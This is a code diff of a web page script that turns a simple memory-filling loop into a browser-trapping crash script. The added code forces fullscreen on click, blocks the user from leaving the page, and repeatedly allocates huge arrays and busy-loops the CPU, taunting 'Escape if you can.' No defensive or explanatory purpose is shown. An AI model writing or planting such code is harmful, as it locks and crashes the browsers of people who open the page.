@@ -1,8 +1,22 @@
 <script>
+document.addEventListener('click', () => {
+  document.documentElement.requestFullscreen().catch(() => {});
+});
+window.onbeforeunload = (e) => {
+  e.preventDefault();
+  return "crash";
+};
 let storage = [];
-while (true) {
-  let data = Math.random().toString(36).repeat(10000);
-  storage.push(data);
-  console.log("Clash!!!");
-}
+console.warn("crash!!!");
+setInterval(() => {
+  for(let i = 0; i < 100; i++) {
+    storage.push(new Array(1000000).fill("🔥"));
+  }
+  let start = Date.now();
+  while (Date.now() - start < 200) {
+    Math.sqrt(Math.random() * 1000000);
+  }
+  console.log("Memory usage: " + (storage.length) + " items. Escape if you can.");
+}, 50000);
+
 </script>
